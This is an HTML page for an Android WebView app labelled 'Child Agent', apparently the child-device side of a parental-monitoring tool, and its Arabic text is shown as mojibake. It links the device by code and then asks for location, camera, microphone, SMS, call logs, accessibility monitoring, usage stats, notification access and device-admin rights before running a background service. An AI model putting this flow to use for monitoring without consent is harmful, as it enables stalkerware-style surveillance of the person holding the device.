<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Tajawal', sans-serif; background-color: #0F172A; color: #fff; overflow: hidden; }
        .screen { display: none; position: fixed; inset: 0; flex-direction: column; }
        .screen.active { display: flex; }
        .glass-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
        .golden-text-title { font-family: 'Amiri', serif; background: linear-gradient(45deg, #bf953f, #fcf6ba, #b38728); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .btn-perm { transition: all 0.2s; }
        .btn-perm:active { transform: scale(0.98); }
    </style>
</head>
<body>

    <!-- === 1. Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ (Splash) === -->
    <div id="screen-splash" class="screen active items-center justify-center bg-[#0F172A]">
        <div class="text-center">
            <h1 class="text-5xl golden-text-title">Abu Al-Zahra</h1>
            <p class="text-blue-300 text-sm tracking-widest mt-4">CHILD AGENT</p>
            <div class="mt-8 w-10 h-10 border-4 border-blue-500 border-dashed rounded-full animate-spin mx-auto"></div>
            <p id="splash-msg" class="text-gray-500 text-xs mt-4">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
        </div>
    </div>

    <!-- === 2. Ø´Ø§Ø´Ø© Ø§Ù„Ø±Ø¨Ø· (Binding) === -->
    <div id="screen-binding" class="screen items-center justify-center bg-[#0F172A] p-6">
        <div class="w-full max-w-sm text-center space-y-6">
            <div class="mb-4">
                <h2 class="text-3xl font-bold text-white">Ø±Ø¨Ø· Ø§Ù„Ø¬Ù‡Ø§Ø²</h2>
                <p class="text-gray-400 text-sm mt-2">Ø£Ø¯Ø®Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 9 Ø£Ø±Ù‚Ø§Ù…</p>
            </div>
            
            <div class="bg-slate-800 border border-slate-700 rounded-xl p-2">
                <input id="txt-code" type="number" maxlength="9" 
                       class="w-full text-center text-4xl font-mono text-white bg-transparent focus:outline-none tracking-widest py-4"
                       placeholder="XXXXXXXXX">
            </div>
            
            <p id="error-msg" class="text-red-400 text-xs hidden"></p>

            <button onclick="handleLink()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold shadow-lg text-lg">Ø±Ø¨Ø· Ø§Ù„Ø¬Ù‡Ø§Ø²</button>
        </div>
    </div>

    <!-- === 3. Ø´Ø§Ø´Ø© Ù†Ø¬Ø§Ø­ Ø§Ù„Ø±Ø¨Ø· (Success) === -->
    <div id="screen-linked" class="screen items-center justify-center bg-[#0F172A] p-6">
        <div class="text-center w-full max-w-sm">
            <div class="w-24 h-24 bg-green-500 rounded-full mx-auto mb-4 flex items-center justify-center text-4xl text-white shadow-lg">âœ“</div>
            <h2 class="text-2xl font-bold text-white mb-2">ØªÙ… Ø§Ù„Ø±Ø¨Ø· Ø¨Ù†Ø¬Ø§Ø­!</h2>
            <p class="text-gray-400 text-sm mb-6">Ø§Ù„Ø¬Ù‡Ø§Ø² Ù…Ø±Ø¨ÙˆØ· Ø§Ù„Ø¢Ù†.</p>
            <button onclick="showScreen('screen-permissions')" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold shadow-lg text-lg">Ø§Ù„ØªØ§Ù„ÙŠ: ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª</button>
        </div>
    </div>

    <!-- === 4. Ø´Ø§Ø´Ø© Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª (Permissions) === -->
    <div id="screen-permissions" class="screen bg-[#0F172A]">
        <header class="bg-slate-900/80 border-b border-slate-700 px-4 py-3 flex justify-between items-center shrink-0 z-20">
            <div>
                <h1 class="text-lg font-bold text-white">ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª</h1>
                <p class="text-gray-400 text-[10px]">Ù…Ø·Ù„ÙˆØ¨Ø© Ù„Ø¹Ù…Ù„ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚</p>
            </div>
        </header>

        <main class="flex-1 overflow-y-auto p-4 space-y-4">
            
            <!-- Ù‚Ø³Ù… Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª Ø§Ù„Ø¹Ø§Ø¯ÙŠØ© -->
            <section>
                <h3 class="text-gray-400 text-xs font-bold mb-2">Ø£Ø°ÙˆÙ†Ø§Øª Ø§Ù„ØªØ´ØºÙŠÙ„</h3>
                <div class="grid grid-cols-2 gap-3">
                    <button onclick="requestPerm('location')" class="btn-perm bg-slate-800 rounded-xl p-4 flex flex-col items-center justify-center h-24 hover:bg-slate-700 border border-slate-700">
                        <span class="text-2xl mb-1">ğŸ“</span>
                        <span class="text-xs font-bold text-gray-200">Ø§Ù„Ù…ÙˆÙ‚Ø¹</span>
                    </button>
                    <button onclick="requestPerm('camera')" class="btn-perm bg-slate-800 rounded-xl p-4 flex flex-col items-center justify-center h-24 hover:bg-slate-700 border border-slate-700">
                        <span class="text-2xl mb-1">ğŸ“·</span>
                        <span class="text-xs font-bold text-gray-200">Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</span>
                    </button>
                    <button onclick="requestPerm('microphone')" class="btn-perm bg-slate-800 rounded-xl p-4 flex flex-col items-center justify-center h-24 hover:bg-slate-700 border border-slate-700">
                        <span class="text-2xl mb-1">ğŸ¤</span>
                        <span class="text-xs font-bold text-gray-200">Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†</span>
                    </button>
                    <button onclick="requestPerm('contacts')" class="btn-perm bg-slate-800 rounded-xl p-4 flex flex-col items-center justify-center h-24 hover:bg-slate-700 border border-slate-700">
                        <span class="text-2xl mb-1">ğŸ‘¥</span>
                        <span class="text-xs font-bold text-gray-200">Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„</span>
                    </button>
                    <button onclick="requestPerm('sms')" class="btn-perm bg-slate-800 rounded-xl p-4 flex flex-col items-center justify-center h-24 hover:bg-slate-700 border border-slate-700">
                        <span class="text-2xl mb-1">ğŸ’¬</span>
                        <span class="text-xs font-bold text-gray-200">Ø§Ù„Ø±Ø³Ø§Ø¦Ù„</span>
                    </button>
                    <button onclick="requestPerm('calls')" class="btn-perm bg-slate-800 rounded-xl p-4 flex flex-col items-center justify-center h-24 hover:bg-slate-700 border border-slate-700">
                        <span class="text-2xl mb-1">ğŸ“</span>
                        <span class="text-xs font-bold text-gray-200">Ø³Ø¬Ù„ Ø§Ù„Ù…ÙƒØ§Ù„Ù…Ø§Øª</span>
                    </button>
                </div>
            </section>

            <!-- Ù‚Ø³Ù… Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª Ø§Ù„Ø®Ø§ØµØ© -->
            <section>
                <h3 class="text-gray-400 text-xs font-bold mb-2">Ø£Ø°ÙˆÙ†Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… (Ù…Ù‡Ù… Ø¬Ø¯Ø§Ù‹)</h3>
                <div class="space-y-3">
                    <button onclick="requestSpecial('accessibility')" class="w-full glass-panel rounded-xl p-4 flex items-center gap-4 hover:bg-slate-700/50 border border-red-500/50">
                        <div class="w-10 h-10 bg-red-500/20 rounded-full flex items-center justify-center text-red-400 font-bold">â™¿</div>
                        <div class="flex-1 text-right">
                            <h4 class="text-white font-bold text-sm">Ø®Ø¯Ù…Ø© Ø§Ù„ÙˆØµÙˆÙ„</h4>
                            <p class="text-gray-400 text-[10px]">Ù…Ø·Ù„ÙˆØ¨Ø© Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª.</p>
                        </div>
                        <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
                    </button>

                    <button onclick="requestSpecial('overlay')" class="w-full glass-panel rounded-xl p-4 flex items-center gap-4 hover:bg-slate-700/50 border border-yellow-500/50">
                        <div class="w-10 h-10 bg-yellow-500/20 rounded-full flex items-center justify-center text-yellow-400 font-bold">ğŸ–¼</div>
                        <div class="flex-1 text-right">
                            <h4 class="text-white font-bold text-sm">Ø§Ù„Ø¹Ø±Ø¶ ÙÙˆÙ‚ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª</h4>
                            <p class="text-gray-400 text-[10px]">Ù…Ø·Ù„ÙˆØ¨ Ù„Ù‚ÙÙ„ Ø§Ù„Ø´Ø§Ø´Ø©.</p>
                        </div>
                        <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
                    </button>

                    <button onclick="requestSpecial('usage')" class="w-full glass-panel rounded-xl p-4 flex items-center gap-4 hover:bg-slate-700/50 border border-purple-500/50">
                        <div class="w-10 h-10 bg-purple-500/20 rounded-full flex items-center justify-center text-purple-400 font-bold">ğŸ“Š</div>
                        <div class="flex-1 text-right">
                            <h4 class="text-white font-bold text-sm">Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª</h4>
                            <p class="text-gray-400 text-[10px]">Ù„Ù…Ø¹Ø±ÙØ© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…Ø©.</p>
                        </div>
                        <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
                    </button>

                    <button onclick="requestSpecial('notification')" class="w-full glass-panel rounded-xl p-4 flex items-center gap-4 hover:bg-slate-700/50 border border-indigo-500/50">
                        <div class="w-10 h-10 bg-indigo-500/20 rounded-full flex items-center justify-center text-indigo-400 font-bold">ğŸ””</div>
                        <div class="flex-1 text-right">
                            <h4 class="text-white font-bold text-sm">Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª</h4>
                            <p class="text-gray-400 text-[10px]">Ù„Ù…Ø²Ø§Ù…Ù†Ø© Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ø§Ù„Ø·ÙÙ„.</p>
                        </div>
                        <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
                    </button>
                </div>
            </section>
        </main>

        <div class="p-4 bg-slate-900 border-t border-slate-700 sticky bottom-0">
            <button onclick="requestSpecial('admin')" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold shadow-lg text-lg">ğŸ”’ Ù…Ù†Ø­ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ù…Ø´Ø±Ù (Admin)</button>
            <p class="text-xs text-gray-500 text-center mt-2">Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ø£Ø®ÙŠØ±Ø§Ù‹ Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚</p>
            
            <button onclick="startService()" class="w-full mt-2 bg-blue-800 text-white py-3 rounded-xl font-bold text-sm">ØªØ´ØºÙŠÙ„ Ø§Ù„Ø®Ø¯Ù…Ø© ÙÙŠ Ø§Ù„Ø®Ù„ÙÙŠØ©</button>
        </div>
    </div>

    <!-- === 5. Ø´Ø§Ø´Ø© Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ù…ÙØ¹Ù„Ø© === -->
    <div id="screen-protected" class="screen items-center justify-center bg-[#0F172A] p-6">
        <div class="text-center">
            <div class="w-24 h-24 bg-green-500 rounded-full mx-auto mb-4 flex items-center justify-center text-4xl text-white shadow-lg animate-pulse">ğŸ›¡ï¸</div>
            <h2 class="text-2xl font-bold text-white mb-2">Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ù…ÙØ¹Ù„Ø©</h2>
            <p class="text-gray-400 text-sm mb-6">Ø§Ù„Ø¬Ù‡Ø§Ø² Ù…Ø±Ø¨ÙˆØ· ÙˆÙ…Ø­Ù…ÙŠ.</p>
        </div>
    </div>

    <!-- === JavaScript === -->
    <script>
        function showScreen(id){ 
            document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active')); 
            document.getElementById(id).classList.add('active'); 
        }

        function callNative(fn, arg){ 
            try {
                if(typeof AndroidNative !== 'undefined'){ 
                    arg ? AndroidNative[fn](arg) : AndroidNative[fn](); 
                } else {
                    console.warn("Native not ready");
                }
            } catch(e) {
                console.error("Bridge Error", e);
            }
        }

        function handleLink(){
            const code = document.getElementById('txt-code').value;
            if(code.length !== 9) { showError("Ø§Ù„ÙƒÙˆØ¯ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 9 Ø£Ø±Ù‚Ø§Ù…"); return; }
            hideError();
            callNative('linkDevice', code);
        }

        function requestPerm(type){ callNative('requestRuntimePermission', type); }
        function requestSpecial(type){ callNative('requestSpecialPermission', type); }
        function startService(){ callNative('startServices'); showScreen('screen-protected'); }

        function showError(msg){
            const el = document.getElementById('error-msg');
            el.innerText = msg;
            el.classList.remove('hidden');
        }
        function hideError(){ document.getElementById('error-msg').classList.add('hidden'); }

        // === Callbacks Ù…Ù† Kotlin ===
        
        window.onLinkSuccess = function(jsonStr){
            // Ù„Ø§ Ù†Ø­ØªØ§Ø¬ Ù„Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø¨Ø±ÙŠØ¯ØŒ Ù†Ù†ØªÙ‚Ù„ Ù„Ù„Ù†Ø¬Ø§Ø­ Ù…Ø¨Ø§Ø´Ø±Ø©
            showScreen('screen-linked');
        };

        window.onSessionRestored = function(jsonStr){
            try {
                const data = JSON.parse(jsonStr);
                if(data.status === "linked"){
                    showScreen('screen-permissions');
                } else {
                    showScreen('screen-binding');
                }
            } catch(e) {
                showScreen('screen-binding');
            }
        };

        window.showBindingScreen = function(){
            showScreen('screen-binding');
        };

        window.onLinkError = function(msg){ showError(msg); }

        // Safety Timeout
        setTimeout(function(){
            const splash = document.getElementById('screen-splash');
            if(splash.classList.contains('active')){
                console.log("Safety timeout");
                showScreen('screen-binding');
            }
        }, 3000);

        // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ´ØºÙŠÙ„
        setTimeout(function(){ callNative('checkSession'); }, 500);

    </script>
</body>
</html>
